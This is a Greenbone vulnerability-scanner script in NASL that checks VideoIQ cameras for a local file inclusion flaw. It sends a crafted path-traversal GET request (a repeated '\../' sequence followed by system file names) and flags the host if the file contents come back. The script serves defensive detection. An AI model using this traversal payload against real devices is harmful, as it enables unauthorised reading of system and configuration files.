# SPDX-FileCopyrightText: 2016 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:videoiq:videoiq_camera";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.807356");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2016-08-23 16:18:17 +0530 (Tue, 23 Aug 2016)");
  script_name("VideoIQ Camera Local File Inclusion Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_videoiq_camera_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 8080);
  script_mandatory_keys("videoiq/camera/detected");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/40284");

  script_tag(name:"summary", value:"VideoIQ Camera is prone to local file disclosure vulnerability");

  script_tag(name:"vuldetect", value:"Send the crafted http GET request
  and check whether it is able to access sensitive files or not.");

  script_tag(name:"insight", value:"The flaw exists due to an insufficient
  sanitization of user supplied input for file requests.");

  script_tag(name:"impact", value:"Successful exploitation will allow a remote
  attacker to read any file system including file configurations.");

  script_tag(name:"affected", value:"VideoIQ Camera all Versions.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("misc_func.inc");
include("traversal_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("os_func.inc");

if(!port = get_app_port(cpe:CPE))
  exit(0);

if(!get_app_location(cpe:CPE, port:port, nofork:TRUE))
  exit(0);

files = traversal_files();

foreach file (keys(files)){

  url = "/" + crap(data: "\../", length: 3*15) + files[file];

  if(http_vuln_check(port:port, url:url, check_header:TRUE, pattern:file)){
    report = http_report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
